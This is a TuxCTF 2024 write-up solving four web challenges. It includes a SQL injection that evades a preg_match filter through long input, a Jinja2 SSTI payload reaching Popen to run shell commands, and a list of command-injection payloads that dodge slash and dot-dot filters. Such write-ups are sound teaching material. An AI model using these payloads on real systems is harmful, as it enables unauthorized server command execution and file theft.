# TuxCTF 2024 web Writeups

Hello, This is the Intended solutions for TuxCTF 2024 web Challenges

## Level1 Sanity Check

you just have to view the page source

![image](/assets/img/tuxctf2024/level1/level1.png)

The Flag: 
```text
tuxCTF{a1wAyS_ch3Ck_C0Mm3ntS}
```
--------
## Level2 can you login? 

We enter the link and find a login page

![image](/assets/img/tuxctf2024/level2/level2-1.png)

And we have the source code , whats intresting is the login.php file

![image](/assets/img/tuxctf2024/level2/level2-2.png)

We find a waf function, how does preg_match works it searchs for anything but litters and numbers, so anything else will be blocked!

![image](/assets/img/tuxctf2024/level2/level2-3.png)

but preg_match is vulnerable, we can bypass it by giving it a long input, then it will not sanatize all of it and we can do sql injection!

![image](/assets/img/tuxctf2024/level2/level2-4.png)

in shell 
```bash
python3 -c 'print("A" * 9000)'
```
we copy the output and put in the last of it 'or true-- '

![image](/assets/img/tuxctf2024/level2/level2-5.png)

and we have the flag!!!

![image](/assets/img/tuxctf2024/level2/level2-6.png)

The Flag:
```text
tuxCTF{$4n1T!ze_y0Ur_qu3rIeS} 
```
--------
## Level3 Templates

We go to the link , the page is empty, we notice the querey parameter "template".

In the source code we discover it's a web app with flask.

![image](/assets/img/tuxctf2024/level3/level3-1.png)

a waf that blocks some words.

A quick google search and we know that flask is vulnerable to ssti!!!

to test it we will use the payload {{7*7}}

![image](/assets/img/tuxctf2024/level3/level3-2.png)

and success it returned 49 which means it calculated it.

[SSTI payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)

we try this payload ``` dict.__base__.__subclasses__() ```

![image](/assets/img/tuxctf2024/level3/level3-3.png)

we get a list of python classes, what we are intrested in is popen , if we can access it we can do anything on the server!!!

we have two ways to determine the popen class number:
1) write a python script which i will not do
2) fuzzing until we get it

on my local machine i got this ```dict.__base__.__subclasses__()[291]```

![image](/assets/img/tuxctf2024/level3/level3-4.png)

The Full Payload:
```bash
dict.__base__.__subclasses__()[291]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()
```

![image](/assets/img/tuxctf2024/level3/level3-5.png)

The Flag: 
```text
tuxCTF{1s_1t_5$ti_0r_5$rf}
```

## Level4 dots

for this challenge you also have the source code.

it's also a flask web app, but you can only access /run_command and only send post requests to it.

![image](/assets/img/tuxctf2024/level4/level4-1.png)

open burpsuite and intercept the request.

right click in the request to change the method to POST.

![image](/assets/img/tuxctf2024/level4/level4-2.png)

if you try to send the request with anything this will be the response:

![image](/assets/img/tuxctf2024/level4/level4-3.png)

if we look back at the source code we will know that it takes the body parameters in json format.

```python
data = request.get_json()
```
then it will look for the key "command" and sanatize the data.

```python
if 'command' in data:
        command = str(data['command'])

        # Length check
        if len(command) < 5:
            return jsonify({'message': 'Command too short'}), 501

        # Perform security checks
        if '..' in command or '/' in command:
            return jsonify({'message': 'Hacking attempt detected'}), 501
```
to be able to send json data we need to change the header content type to application/json.

then add ```{"command" : "hi"}``` to the body of the request.

now if we send it we will get this response: 

![image](/assets/img/tuxctf2024/level4/level4-4.png)

which means our payload is working.

now let's understand how does the app work:

```python
# Find path to executable
        executable_to_run = command.split()[0]

        # Check if we can execute the binary
        if os.access(executable_to_run, os.X_OK):

            # Execute binary if it exists and is executable
            out = os.popen(command).read()
            return jsonify({'message': 'Command output: ' + str(out)}), 200

    return jsonify({'message': 'Not implemented'}), 501


if __name__ == '__main__':

    # Make sure we can only execute binaries in the executables directory
    os.chdir('./executables/')

    # Run server
    app.run(host='0.0.0.0', port=7000)
```
here we can see that it will take the payload we send it, in the payload {"command" : "hi"} it will take it "hi" and then checks if it's an executable in a direcroty named executables.
we know this directory is empty from the docker file.

since the app is running on a linux machine we know that the if the file is executable it will have the "x" permission.

if we try to do the command ```ls -la``` in a local linux machine this the output:

![image](/assets/img/tuxctf2024/level4/level4-5.png)

we notice that . and .. are executable, .. is blacklisted but . is not!

if send ```{"command" : "."}``` we will get command to short, but if we send it with spaces ```{"command" : ".     "}```

![image](/assets/img/tuxctf2024/level4/level4-6.png)

it works !!!

the output is empty becuase the command . doesnt give anything back, but we know in linux we can do multiple commands in one line using pipe ```|``` or a semicolon, let's try that.

```{"command" : ". | pwd"}```

![image](/assets/img/tuxctf2024/level4/level4-7.png)

it works!!!

if we try ```{"command" : ". | ls .."}``` or ```{"command" : ". | ls /"}``` it will respond with:

![image](/assets/img/tuxctf2024/level4/level4-8.png)

to bypass this we can do alot of things, i choose to do ```{"command" : ". | ls .''."}```

![image](/assets/img/tuxctf2024/level4/level4-9.png)

we can see that flag.txt is in the before directory, to bypass the slash restriction we can use ```${HOME:0:1}```

```{"command" : ". | cat .''.${HOME:0:1}flag.txt"}```

to understand the payload, if we run echo ```.''. ``` in any linux terminal the output will be ```..```.
and ```${HOME:0:1}```, ${} we tell the shell to give us the output of some opreation, here we tell it to take the home path variable , which is in every linux system, then it will slice it, for example the home direcroy absolute path is ```/home/kali``` it will take the first character which is ```/```, so what will be executed in the machine terminal is
```bash
. | cat ../flag.txt
```
you can find various bypassing techniques in hacktricks:

The Flag:

```text
tuxCTF{d0t$_4r3_3XeCut@b13}
```
here is a list of all inteded payloads to solve this challenge:

```json
{ "command" : ". | ((echo Li4vZmxhZy50eHQ= | base64 -d) | xargs cat)" }
{ "command" : ". | ((echo L3Vzci9zcmMvYXBwL2ZsYWcudHh0 | base64 -d) | xargs cat)"}
{ "command" : ". <(echo true) && cd $(dirname $PWD) && cat flag.txt" }
{ "command" : ". <(echo true) ; cd $(dirname $PWD) ; cat flag.txt" }
{ "command" : ". | cat ${HOME:0:1}usr${HOME:0:1}src${HOME:0:1}app${HOME:0:1}flag.txt" }
{ "command" : ". ; python -c 'import os;x=os.path.normpath(os.getcwd() + os.sep + os.pardir);os.chdir(x);os.system(\"cat flag.txt\")'"}
{ "command" : ". $ or | or ; cat .''.${HOME:0:1}flag.txt 2>&1"}
{ "command" : ". <(echo true) &&  cat  .''.${HOME:0:1}flag.txt " }
```

happy pwning :)
